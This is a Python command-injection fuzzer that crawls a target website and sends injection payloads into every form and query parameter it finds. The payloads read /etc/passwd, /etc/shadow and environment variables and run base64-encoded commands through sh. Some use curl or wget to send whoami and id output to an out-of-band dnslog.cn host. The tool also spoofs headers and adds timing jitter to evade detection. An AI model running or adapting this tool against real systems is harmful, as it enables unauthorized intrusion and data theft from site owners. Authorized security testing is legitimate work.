#!/usr/bin/env python3
# ════════════════════════════════════════════════════════════════════════════
#  CMD‑Injection AI Fuzzer  (v5.1, 2025‑04‑21)
#  Author : Haroon Ahmad Awan · CyberZeus  <haroon@cyberzeus.pk>
# ════════════════════════════════════════════════════════════════════════════

import os, re, sys, time, ssl, json, random, string, logging, warnings, argparse
import urllib.parse, requests
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from playwright.sync_api import sync_playwright      # ← NEW dependency

# ── CodeBERT bootstrap (optional) ───────────────────────────────────────────
USE_CODEBERT = False
try:
    from transformers import AutoTokenizer, AutoModelForMaskedLM
    TOKENIZER  = AutoTokenizer.from_pretrained("microsoft/codebert-base")
    MODEL      = AutoModelForMaskedLM.from_pretrained("microsoft/codebert-base")
    MODEL.eval(); USE_CODEBERT = True
except Exception as e:
    logging.warning(f"[AI] Unavailable → {e}")

# ── Global config ───────────────────────────────────────────────────────────
VERSION         = "5.1"
DNSLOG_DOMAIN   = f"cmdi{random.randint(1000,9999)}.dnslog.cn"
LOGFILE         = Path("cmdi_results.md")
TIMEOUT_REQ     = 7          # seconds
MAX_PAGES       = 120
DEFAULT_THREADS = 14
JITTER_DELAY    = (0.35, 1.2)

# ── CLI ─────────────────────────────────────────────────────────────────────
PARSER = argparse.ArgumentParser()
PARSER.add_argument("-u","--url", required=True, help="Target root URL")
PARSER.add_argument("--threads", type=int, default=DEFAULT_THREADS)
PARSER.add_argument("--max-pages", type=int, default=MAX_PAGES)
PARSER.add_argument("--debug", action="store_true")
ARGS = PARSER.parse_args()
logging.basicConfig(level=logging.DEBUG if ARGS.debug else logging.INFO)
warnings.filterwarnings("ignore")
ssl._create_default_https_context = ssl._create_unverified_context

# ═══════════════════════════════════════════════════════════════════════════
#  1. Payload Factory  (unchanged)
# ═══════════════════════════════════════════════════════════════════════════
BASE_CMDS = [
    "id", "whoami", "uname -a", "cat /etc/passwd", "cat /etc/shadow",
    "sleep 5", "ping -c 1 127.0.0.1", "ls /", "env",
    f"curl http://{DNSLOG_DOMAIN}/$(whoami)",
    f"wget http://{DNSLOG_DOMAIN}/$(id)"
]

def hexify(s:str)->str:  return ''.join(f"\\x{ord(c):02x}" for c in s)
def urlenc(s:str)->str:  return urllib.parse.quote(s,safe='')
def urlenc2(s:str)->str: return urllib.parse.quote(urlenc(s),safe='')
def b64(s:str)->str:     return os.popen(f'printf %s \"{s}\" | base64').read().strip()
def nullbyte(s:str)->str:return s+"%00"
def comment(s:str)->str: return s+" #"

WRAPPERS = [
    lambda c:f"$({c})",          lambda c:f"`{c}`",
    lambda c:f"|{c}|",           lambda c:f";{c};",
    lambda c:f"||{c}||",         lambda c:f"&&{c}&&",
    lambda c:f"$(echo {c}|sh)",
    lambda c:f"$(echo {b64(c)}|base64 -d|sh)",
    lambda c:f"${{IFS}}{c}${{IFS}}",
]

def codebert_mutate(cmd:str, top=3):
    if not USE_CODEBERT or len(cmd.split())>4: return []
    masked=f"{cmd} && [MASK]"
    ids=TOKENIZER.encode(masked,return_tensors="pt")
    mi=(ids==TOKENIZER.mask_token_id).nonzero(as_tuple=True)[1]
    preds=MODEL(ids).logits[0,mi].topk(top).indices[0]
    return [masked.replace("[MASK]",TOKENIZER.decode([t]).strip()) for t in preds]

def build_payloads():
    pl=set()
    for c in BASE_CMDS:
        for w in WRAPPERS:
            pl.update({w(c),urlenc(w(c)),urlenc2(w(c)),hexify(w(c)),nullbyte(w(c)),comment(w(c))})
        for ai in codebert_mutate(c):
            pl.update({ai, w(ai), urlenc(ai)})
    out=list(pl); random.shuffle(out); return out[:120]

PAYLOADS = build_payloads()

# ═══════════════════════════════════════════════════════════════════════════
#  2. Helpers
# ═══════════════════════════════════════════════════════════════════════════
def smart_url(u:str)->str:
    if u.startswith("http"): return u
    try:
        if requests.head("https://"+u,timeout=5).ok: return "https://"+u
    except: pass
    return "http://"+u

UA=UserAgent()
def rand_headers():
    return {
        "User-Agent": UA.random,
        "X-Forwarded-For": f"127.0.0.{random.randint(2,254)}",
        "Accept": "*/*",
        "Referer": random.choice(["https://google.com","https://bing.com"]),
        "Origin": random.choice(["https://localhost","https://127.0.0.1"])
    }

def log_hit(url,param,payload,mode):
    entry=f"- **{mode}** `{url}` • **{param}** → `{payload}`\n"
    with LOGFILE.open("a",encoding="utf-8") as f: f.write(entry)
    logging.info(entry.strip())

# ═══════════════════════════════════════════════════════════════════════════
#  3. Dynamic‑Aware Crawler
# ═══════════════════════════════════════════════════════════════════════════
_JS_URL_RE = re.compile(r'(https?:\/\/[^"\'\s]+)', re.I)

def _add_target(targets:list, url:str, method:str, params:list):
    if params:
        targets.append({"url":url,"method":method,"params":sorted(set(params))})

def crawl(root:str, cap:int):
    visited, queue, targets = set(), [root], []
    domain = urllib.parse.urlparse(root).netloc.lower()

    with sync_playwright() as p:
        browser = p.firefox.launch(headless=True, args=["--no-sandbox"])
        ctx     = browser.new_context(ignore_https_errors=True)

        while queue and len(visited) < cap:
            url = queue.pop(0)
            if url in visited: continue
            visited.add(url)

            # ── Static pass -------------------------------------------------
            try:
                r = requests.get(url, headers=rand_headers(), timeout=TIMEOUT_REQ)
                if "text/html" in r.headers.get("Content-Type",""):
                    soup = BeautifulSoup(r.text,"html.parser")

                    # <a href>
                    for a in soup.find_all("a",href=True):
                        nxt = urllib.parse.urljoin(url,a["href"])
                        if urllib.parse.urlparse(nxt).netloc.lower()==domain:
                            if nxt not in visited: queue.append(nxt)
                            if "?" in nxt:
                                qs=list(urllib.parse.parse_qs(
                                          urllib.parse.urlparse(nxt).query))
                                _add_target(targets,nxt.split("?")[0],"GET",qs)

                    # <form>
                    for fm in soup.find_all("form"):
                        act = urllib.parse.urljoin(url,fm.get("action") or url)
                        if urllib.parse.urlparse(act).netloc.lower()!=domain: continue
                        names=[i.get("name") for i in fm.find_all("input",{"name":True})]
                        _add_target(targets,act,fm.get("method","GET").upper(),names)
            except Exception as e:
                if ARGS.debug: logging.debug(f"[static] {e}")

            # ── Dynamic JS pass --------------------------------------------
            try:
                pg = ctx.new_page(); seen_req=set()
                def on_request(req):
                    if urllib.parse.urlparse(req.url).netloc.lower()!=domain: return
                    if req.url in seen_req: return
                    seen_req.add(req.url)

                    if req.method=="GET" and "?" in req.url:
                        qs=list(urllib.parse.parse_qs(
                                 urllib.parse.urlparse(req.url).query))
                        _add_target(targets,req.url.split("?")[0],"GET",qs)
                    elif req.method in {"POST","PUT","PATCH"}:
                        params=[]
                        body=req.post_data or ""
                        if "=" in body and "&" in body:
                            params=list(urllib.parse.parse_qs(body).keys())
                        elif body.strip().startswith("{"):
                            try: params=list(json.loads(body).keys())
                            except: pass
                        _add_target(targets,req.url,req.method,params)
                pg.on("request",on_request)
                pg.goto(url, wait_until="networkidle", timeout=TIMEOUT_REQ*1000)
                pg.wait_for_timeout(1200)

                dom = BeautifulSoup(pg.content(),"html.parser")
                for a in dom.find_all("a",href=True):
                    nxt = urllib.parse.urljoin(url,a["href"])
                    if urllib.parse.urlparse(nxt).netloc.lower()!=domain: continue
                    if nxt not in visited: queue.append(nxt)
                    if "?" in nxt:
                        qs=list(urllib.parse.parse_qs(
                                  urllib.parse.urlparse(nxt).query))
                        _add_target(targets,nxt.split("?")[0],"GET",qs)
                for fm in dom.find_all("form"):
                    act=urllib.parse.urljoin(url,fm.get("action") or url)
                    if urllib.parse.urlparse(act).netloc.lower()!=domain: continue
                    names=[i.get("name") for i in fm.find_all("input",{"name":True})]
                    _add_target(targets,act,fm.get("method","GET").upper(),names)
                pg.close()
            except Exception as e:
                if ARGS.debug: logging.debug(f"[dynamic] {e}")

        ctx.close(); browser.close()
    return targets

# ═══════════════════════════════════════════════════════════════════════════
#  4. Fuzzer / detector  (unchanged)
# ═══════════════════════════════════════════════════════════════════════════
def fuzz(tgt:dict):
    url,method,params = tgt["url"], tgt["method"], tgt["params"]
    baseline=None
    for p in params:
        for pay in PAYLOADS:
            data={k:pay if k==p else "test" for k in params}
            try:
                start=time.time()
                resp = (requests.get if method=="GET" else requests.post)(
                        url, params=data if method=="GET" else None,
                        data=data   if method!="GET" else None,
                        headers=rand_headers(), timeout=TIMEOUT_REQ)
                delta=time.time()-start
                time.sleep(random.uniform(*JITTER_DELAY))

                if baseline is None and "sleep 5" not in pay:
                    baseline=delta+1.5

                body=resp.text.lower()
                if any(k in body for k in ("uid=","gid=","root:x","cyz")):
                    log_hit(url,p,pay,"IN‑BAND"); break
                if "sleep" in pay and baseline and delta>baseline+3:
                    log_hit(url,p,pay,"TIME"); break
            except Exception as e:
                if ARGS.debug: logging.debug(e)

# ═══════════════════════════════════════════════════════════════════════════
def main():
    if not LOGFILE.exists():
        LOGFILE.write_text(f"# Command‑Injection Findings v{VERSION}\n\n")
    root=smart_url(ARGS.url.rstrip("/"))
    logging.info(f"[*] Target: {root}  •  DNSLog beacon = {DNSLOG_DOMAIN}")
    surf=crawl(root,ARGS.max_pages)
    logging.info(f"[+] {len(surf)} attack surfaces discovered (static + dynamic)")
    with ThreadPoolExecutor(max_workers=ARGS.threads) as pool:
        pool.map(fuzz,surf)
    logging.info(f"[✓] Scan complete → {LOGFILE.resolve()}")

if __name__=="__main__":
    main()

